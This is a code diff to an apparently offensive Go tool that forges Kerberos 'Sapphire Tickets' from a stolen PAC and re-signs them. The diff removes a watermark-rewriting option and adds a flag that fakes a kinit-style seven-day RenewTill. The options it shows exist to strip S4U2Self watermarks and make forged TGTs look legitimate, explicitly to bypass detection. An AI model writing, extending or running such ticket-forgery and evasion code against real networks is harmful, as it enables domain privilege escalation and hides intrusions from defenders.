@@ -178,12 +178,6 @@ type SapphireTicketRequest struct {
 	// Connection
 	KDC string
 
-	// StripWatermark rewrites S-1-18-2 → S-1-18-1 in the stolen PAC's ExtraSids
-	// before re-signing. The S-1-18-2 SID is added by the KDC to S4U2Self tickets
-	// as a watermark and is structurally impossible for a KDC-issued TGT. Stripping
-	// it may bypass PAC-content-based sapphire detection.
-	StripWatermark bool
-
 	// StripLogonFlags clears the LOGON_RESOURCE_GROUPS (0x200) bit from
 	// KERB_VALIDATION_INFO.UserFlags before re-signing. This is a second S4U2Self
 	// watermark in the PAC, separate from S-1-18-2.
@@ -229,6 +223,13 @@ type SapphireTicketRequest struct {
 	// baseline (no authority-18 SIDs, no Authenticated-Users stub — truly
 	// empty ExtraSids).
 	ClearExtraSids bool
+
+	// KinitRenewTill forces RenewTill to AuthTime + 7 days, matching MIT
+	// kinit's default (KDC_REP_RENEW_TILL = 7 days). The default behavior
+	// inherits RenewTill from the attacker's bootstrap TGT, which goobeus's
+	// NativeASExchange requests as +24h. Setting this to +7d matches what
+	// a legit kinit-issued TGT would carry.
+	KinitRenewTill bool
 }
 
 // SapphireTicketResult contains the Sapphire Ticket.
@@ -482,20 +483,6 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		}
 	}
 
-	// Step 3.75: Optionally substitute S-1-18-2 → S-1-5-11 (Authenticated Users)
-	// in ExtraSids. Legit AS-REQ TGTs carry no authority-18 SID at all, but true
-	// removal requires NDR edits. Substituting with a 12-byte benign SID
-	// preserves PAC validity while eliminating the authority-18 watermark.
-	if req.StripWatermark {
-		fmt.Println("[*] Step 3.75: Substituting S-1-18-2 → S-1-5-11 (Authenticated Users)...")
-		var n int
-		stolenPAC, n = pac.RewriteServiceAssertedIdentity(stolenPAC)
-		if n > 0 {
-			fmt.Printf("[+] Substituted %d S-1-18-2 → S-1-5-11\n", n)
-		} else {
-			fmt.Println("[!] No S-1-18-2 found to substitute (PAC may not carry the watermark)")
-		}
-	}
 
 	// Step 3.76: Optionally clear LOGON_RESOURCE_GROUPS bit in UserFlags.
 	// This is a second S4U2Self watermark in the PAC — the KDC sets this bit on
@@ -557,8 +544,8 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 	}
 
 	// Step 3.76b: Optionally clear ExtraSids entirely — sets SidCount=0 and
-	// the ExtraSids pointer to NULL. Must run AFTER --strip-watermark (if
-	// enabled) so any substitution is also cleared.
+	// the ExtraSids pointer to NULL. Must run before re-signing so SERVER_CKSUM
+	// and KDC_CKSUM cover the cleared state.
 	if req.ClearExtraSids {
 		fmt.Println("[*] Step 3.76b: Clearing ExtraSids (SidCount=0, pointer=NULL)...")
 		var n int
@@ -720,6 +707,10 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 		}
 		if bootRenewOffset <= 0 {
 			bootRenewOffset = 7 * 24 * time.Hour
+		}
+		if req.KinitRenewTill {
+			bootRenewOffset = 7 * 24 * time.Hour
+			fmt.Println("[*] Forcing RenewTill = AuthTime + 7 days (--kinit-renew-till)")
 		}
 		modifiedEncPart.EndTime = modifiedEncPart.AuthTime.Add(bootEndOffset)
 		modifiedEncPart.RenewTill = modifiedEncPart.AuthTime.Add(bootRenewOffset)
